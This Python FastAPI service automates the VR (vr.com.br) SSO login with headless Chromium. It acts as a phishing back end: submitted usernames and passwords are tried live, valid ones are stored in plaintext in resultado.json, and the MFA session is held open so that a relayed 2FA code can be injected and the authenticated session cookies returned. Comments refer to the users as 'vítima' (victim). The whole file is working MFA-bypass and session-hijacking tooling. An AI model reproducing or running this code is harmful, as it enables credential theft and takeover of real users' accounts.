import asyncio
import json
import logging
import os
from datetime import datetime
from pathlib import Path
from typing import Optional

from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn
from playwright.async_api import async_playwright, Browser, BrowserContext, Page, Playwright

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("vr-worker")

app = FastAPI(title="VR SSO Auth Worker", version="2.0.0")

DADOS_JSON = Path("dados.json")
RESULTADO_JSON = Path("resultado.json")

URL_LOGIN = "https://sso-acesso.vr.com.br/u/login?state=hKFo2SA5anVWVzM1WFlDUWwtcHZQMlFsZnJjZllJNktORjVXX6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGNWelFtSWswQzJDSUJ3WWJzQ3ZnajlDUXpSMGJZSXF4o2NpZNkgSzRzQmJmVTVMM3RVcFFOT2NxWWc1OVA3TTI0S3ludUw"
SELECTOR_USERNAME = "#username"
SELECTOR_PASSWORD = "#password"
SELECTOR_CONTINUAR = 'button[data-action-button-primary="true"]'
MFA_URL_PATTERN = "**/u/mfa-email-challenge?state=*"

class TesteRequest(BaseModel):
    usuario: str
    senha: str

class Injetar2FARequest(BaseModel):
    usuario: str
    codigo: str

class WorkerState:
    playwright: Optional[Playwright] = None
    browser: Optional[Browser] = None
    context: Optional[BrowserContext] = None
    page: Optional[Page] = None
    is_ready: bool = False
    lock: asyncio.Lock = asyncio.Lock()

state = WorkerState()
active_sessions: dict[str, dict] = {}
SESSION_TIMEOUT_SECONDS = 180

async def obter_browser():
    """Garante que a instância do Chromium esteja conectada com auto-recovery."""
    try:
        if state.browser and state.browser.is_connected():
            return state.browser
    except Exception:
        pass

    logger.info("[WARM WORKER] Conectando motor Chromium...")
    try:
        if state.playwright:
            try:
                await state.playwright.stop()
            except Exception:
                pass
        state.playwright = await async_playwright().start()
        state.browser = await state.playwright.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage"
            ]
        )
        state.context = None
        state.page = None
    except Exception as e:
        logger.error(f"[WARM WORKER] Falha ao iniciar browser: {e}")
        raise e
    return state.browser

async def preparar_pagina():
    """Pré-carrega o formulário do SSO da VR com cookies e bundles em memória."""
    try:
        state.is_ready = False
        await obter_browser()

        # Tenta reaproveitar a página existente (navegação interna muito mais rápida)
        if state.page and not state.page.is_closed():
            try:
                logger.info("[WARM WORKER] Reciclando aba em memória...")
                await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=25000)
                await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=15000)
                await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=15000)
                state.is_ready = True
                logger.info("[WARM WORKER] ✅ Aba 100% pronta e reciclada!")
                return
            except Exception as rec_err:
                logger.warning(f"[WARM WORKER] Falha ao reciclar aba: {rec_err}. Recriando...")
                try:
                    await state.page.close()
                except Exception:
                    pass

        # Cria novo contexto se necessário
        if not state.context:
            state.context = await state.browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 800},
                locale="pt-BR"
            )

        state.page = await state.context.new_page()
        logger.info("[WARM WORKER] Carregando nova aba no SSO da VR...")
        await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=30000)
        await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=20000)
        await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=20000)

        state.is_ready = True
        logger.info("[WARM WORKER] ✅ Página 100% pronta e pré-aquecida para autenticação instantânea!")
    except Exception as e:
        logger.error(f"[WARM WORKER] Erro ao pré-aquecer página: {e}")
        state.is_ready = False
        await asyncio.sleep(2)
        asyncio.create_task(preparar_pagina())

async def limpar_sessoes_expiradas():
    """Remove periodicamente sessões de MFA inativas que excederam o timeout de 180s."""
    while True:
        try:
            await asyncio.sleep(20)
            agora = asyncio.get_event_loop().time()
            expirados = []
            for k, sess in list(active_sessions.items()):
                if agora - sess.get("created_at", 0) > SESSION_TIMEOUT_SECONDS:
                    expirados.append(k)
            for k in expirados:
                sess = active_sessions.pop(k, None)
                if sess:
                    logger.info(f"[WARM WORKER] Limpando sessão MFA expirada (>180s): {k}")
                    try:
                        p = sess.get("page")
                        if p and not p.is_closed():
                            await p.close()
                        c = sess.get("context")
                        if c:
                            await c.close()
                    except Exception:
                        pass
        except Exception as e:
            logger.error(f"[WARM WORKER] Erro no reaper de sessões: {e}")

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(preparar_pagina())
    asyncio.create_task(limpar_sessoes_expiradas())

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("[WARM WORKER] Encerrando Chromium e Playwright...")
    for k, sess in list(active_sessions.items()):
        try:
            p = sess.get("page")
            if p and not p.is_closed():
                await p.close()
            c = sess.get("context")
            if c:
                await c.close()
        except Exception:
            pass
    active_sessions.clear()
    if state.page and not state.page.is_closed():
        await state.page.close()
    if state.context:
        await state.context.close()
    if state.browser:
        await state.browser.close()
    if state.playwright:
        await state.playwright.stop()

@app.get("/health")
async def health():
    return {
        "status": "ready" if state.is_ready else "warming",
        "has_browser": state.browser is not None and state.browser.is_connected() if state.browser else False,
        "is_ready": state.is_ready
    }

def salvar_resultado_local(usuario: str, senha: str, valido: bool, mensagem: str, url_final: str = ""):
    novo_log = {
        "data_hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "valido": valido,
        "nome": usuario,
        "senha": senha,
        "mensagem": mensagem,
        "url_final": url_final
    }

    logs = []
    if RESULTADO_JSON.exists():
        try:
            with open(RESULTADO_JSON, "r", encoding="utf-8-sig") as f:
                logs = json.load(f)
                if not isinstance(logs, list):
                    logs = []
        except Exception:
            logs = []

    logs.append(novo_log)
    try:
        with open(RESULTADO_JSON, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Erro ao gravar resultado.json: {e}")

@app.post("/testar")
async def testar_credenciais(req: TesteRequest):
    usuario = req.usuario.strip()
    senha = req.senha

    async with state.lock:
        if not state.is_ready or not state.page or state.page.is_closed():
            logger.warning("[WARM WORKER] Página não estava pronta, aguardando carregamento...")
            await preparar_pagina()

        page = state.page
        inicio = asyncio.get_event_loop().time()
        logger.info(f"[WARM WORKER] Testando instantaneamente: {usuario}")

        try:
            # 1. Preenchimento instantâneo (Aba já está aberta no formulário)
            await page.fill(SELECTOR_USERNAME, usuario)
            await page.fill(SELECTOR_PASSWORD, senha)
            await page.click(SELECTOR_CONTINUAR)

            # 2. Loop de detecção ativa (300ms)
            resultado_valido = None
            msg_resultado = ""

            for _ in range(25): # até ~7.5s max
                await asyncio.sleep(0.3)
                url_atual = page.url

                # Se avançou para MFA -> Válido
                if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
                    resultado_valido = True
                    msg_resultado = "Login válido - etapa de código encontrada"
                    break

                # Se detectou erro no DOM -> Inválido
                try:
                    erro_locator = page.locator("#error-element-password, [data-error-code], .ulp-alert-danger, .ulp-input-error-message, .alert-danger, span[id*='error']")
                    count = await erro_locator.count()
                    if count > 0:
                        for i in range(count):
                            el = erro_locator.nth(i)
                            if await el.is_visible():
                                txt = (await el.inner_text()).strip()
                                if txt:
                                    resultado_valido = False
                                    msg_resultado = f"Credenciais incorretas na VR: {txt}"
                                    break
                    if resultado_valido is False:
                        break
                except Exception:
                    pass

            url_final = page.url
            if resultado_valido is None:
                if "mfa-email-challenge" in url_final or "mfa" in url_final.lower():
                    resultado_valido = True
                    msg_resultado = "Login válido - etapa de código encontrada"
                else:
                    resultado_valido = False
                    msg_resultado = "Login inválido ou etapa de código não encontrada."

            duracao = asyncio.get_event_loop().time() - inicio
            logger.info(f"[WARM WORKER] Veredito em {duracao:.2f}s: {'VÁLIDO' if resultado_valido else 'INVÁLIDO'} ({msg_resultado})")

            salvar_resultado_local(usuario, senha, resultado_valido, msg_resultado, url_final)

            user_key = usuario.lower().strip()
            if resultado_valido:
                # Preserva a aba e o contexto na sessão de espera para o 2FA
                logger.info(f"[WARM WORKER] 🔒 Preservando sessão de MFA ativa para {usuario} em active_sessions...")
                active_sessions[user_key] = {
                    "page": page,
                    "context": state.context,
                    "usuario": usuario,
                    "created_at": asyncio.get_event_loop().time()
                }
                # Desconecta do WorkerState para que a próxima vítima ganhe uma nova aba limpa
                state.page = None
                state.context = None
                asyncio.create_task(preparar_pagina())
            else:
                # Recicla a aba normalmente em caso de senha inválida
                asyncio.create_task(preparar_pagina())

            return {
                "success": True,
                "usuario": usuario,
                "valido": resultado_valido,
                "status_credencial": "valido" if resultado_valido else "invalido",
                "mfa_ativo": bool(resultado_valido),
                "mensagem": msg_resultado,
                "tempo_segundos": round(duracao, 2),
                "url_final": url_final
            }

        except Exception as err:
            logger.error(f"[WARM WORKER] Falha na execução: {err}")
            asyncio.create_task(preparar_pagina())
            return {
                "success": False,
                "usuario": usuario,
                "valido": False,
                "status_credencial": "invalido",
                "mensagem": f"Erro interno no worker: {err}"
            }

@app.get("/sessoes")
async def listar_sessoes():
    """Retorna a contagem e status das sessões de MFA aguardando código."""
    agora = asyncio.get_event_loop().time()
    lista = []
    for k, s in active_sessions.items():
        idade = round(agora - s.get("created_at", 0), 1)
        p = s.get("page")
        lista.append({
            "usuario": s.get("usuario", k),
            "idade_segundos": idade,
            "expira_em": max(0, round(SESSION_TIMEOUT_SECONDS - idade, 1)),
            "ativa": p is not None and not p.is_closed()
        })
    return {
        "total_sessoes": len(lista),
        "sessoes": lista
    }

@app.post("/injetar-2fa")
async def injetar_2fa(req: Injetar2FARequest):
    """Injeta o código de segurança 2FA no SSO oficial da VR na aba em espera."""
    usuario = req.usuario.strip()
    user_key = usuario.lower()
    codigo = req.codigo.strip()

    session = active_sessions.get(user_key)
    if not session or not session.get("page") or session["page"].is_closed():
        logger.warning(f"[WARM WORKER] Sessão de MFA não encontrada ou expirada para: {usuario}")
        return {
            "success": False,
            "valido": False,
            "mensagem": "Sessão de MFA expirada ou não encontrada na VR. Por favor, realize o login novamente."
        }

    page: Page = session["page"]
    context: Optional[BrowserContext] = session.get("context")
    logger.info(f"[WARM WORKER] Injetando código 2FA para {usuario}: {codigo}")

    try:
        # Seletores mapeados do Auth0 Universal Login da VR (/u/mfa-email-challenge)
        code_selectors = [
            'input[name="code"]',
            'input#code',
            'input[autocomplete="one-time-code"]',
            'input[type="tel"]',
            'input[type="text"]'
        ]

        input_encontrado = None
        for sel in code_selectors:
            loc = page.locator(sel)
            if await loc.count() > 0 and await loc.first.is_visible():
                input_encontrado = loc.first
                break

        if not input_encontrado:
            try:
                await page.wait_for_selector('input[name="code"], input#code', timeout=3000)
                input_encontrado = page.locator('input[name="code"], input#code').first
            except Exception:
                pass

        if not input_encontrado:
            logger.error(f"[WARM WORKER] Campo de código 2FA não encontrado no DOM para {usuario}")
            return {
                "success": False,
                "valido": False,
                "mensagem": "Campo de código 2FA não localizado no SSO da VR."
            }

        # Limpa e digita o código com delay natural
        await input_encontrado.fill("")
        await input_encontrado.type(codigo, delay=40)

        # Clica no botão de submissão
        btn_continue = page.locator('button[type="submit"], button[data-action-button-primary="true"], button:has-text("Continuar"), button:has-text("Verificar")').first
        if await btn_continue.count() > 0:
            await btn_continue.click()
        else:
            await page.keyboard.press("Enter")

        # Avaliação de resposta em até 6.5s
        resultado_2fa = None
        msg_2fa = ""

        for _ in range(22):
            await asyncio.sleep(0.3)
            url_atual = page.url

            # Caso de Sucesso: Navegou para fora de mfa-email-challenge
            if "mfa-email-challenge" not in url_atual and ("authorize/resume" in url_atual or "superportal" in url_atual or "vr.com.br" in url_atual or "callback" in url_atual):
                if "error=" not in url_atual:
                    resultado_2fa = True
                    msg_2fa = "2FA autenticado com sucesso no SSO da VR"
                    break

            # Caso de Erro: Alerta de código inválido no DOM
            try:
                erro_locator = page.locator("#error-element-code, .ulp-alert-danger, [data-error-code], .ulp-input-error-message, .alert-danger, span[id*='error']")
                if await erro_locator.count() > 0:
                    for i in range(await erro_locator.count()):
                        el = erro_locator.nth(i)
                        if await el.is_visible():
                            txt = (await el.inner_text()).strip()
                            if txt:
                                resultado_2fa = False
                                msg_2fa = f"Código incorreto na VR: {txt}"
                                break
                if resultado_2fa is False:
                    break
            except Exception:
                pass

        if resultado_2fa is None:
            if "mfa-email-challenge" not in page.url:
                resultado_2fa = True
                msg_2fa = "2FA autenticado com sucesso no SSO da VR"
            else:
                resultado_2fa = False
                msg_2fa = "Código 2FA incorreto ou não reconhecido pela VR."

        cookies = []
        if resultado_2fa:
            logger.info(f"[WARM WORKER] 🎉 2FA APROVADO para {usuario}! Aguardando redirecionamento até superportal-empregador...")
            try:
                # Aguarda o redirecionamento sair de authorize/resume e atingir o portal do empregador
                for _ in range(25): # até ~7.5s
                    if page.is_closed():
                        break
                    curr_url = page.url
                    if "superportal" in curr_url or "empregador" in curr_url:
                        break
                    await asyncio.sleep(0.3)

                if not page.is_closed():
                    await page.wait_for_load_state("networkidle", timeout=3000)
            except Exception:
                pass

            try:
                url_final = page.url if not page.is_closed() else url_atual
            except Exception:
                url_final = "https://superportal-empregador.vr.com.br/"

            if not url_final or "authorize/resume" in url_final or "sso-acesso" in url_final:
                url_final = "https://superportal-empregador.vr.com.br/"

            logger.info(f"[WARM WORKER] URL Final da Sessão: {url_final}. Capturando cookies...")
            try:
                if context:
                    cookies = await context.cookies()
                else:
                    cookies = await page.context.cookies()
            except Exception as ce:
                logger.warning(f"Erro ao capturar cookies de sessão: {ce}")

            # Encerra a aba agora que a autenticação está concluída
            try:
                await page.close()
                if context:
                    await context.close()
            except Exception:
                pass
            active_sessions.pop(user_key, None)

            return {
                "success": True,
                "valido": True,
                "mensagem": msg_2fa,
                "cookies": cookies,
                "total_cookies": len(cookies),
                "url_final": url_final
            }
        else:
            logger.warning(f"[WARM WORKER] ❌ 2FA RECUSADO pela VR para {usuario}: {msg_2fa}")
            # Mantém a aba aberta para a vítima poder digitar o código correto novamente
            return {
                "success": True,
                "valido": False,
                "mensagem": msg_2fa,
                "url_final": url_final
            }

    except Exception as e:
        logger.error(f"[WARM WORKER] Exceção ao injetar 2FA: {e}")
        return {
            "success": False,
            "valido": False,
            "mensagem": f"Erro interno ao processar código: {e}"
        }

if __name__ == "__main__":
    host = os.getenv("HOST", "127.0.0.1")
    port = int(os.getenv("PORT", "3005"))
    uvicorn.run("bot_service:app", host=host, port=port, log_level="info")
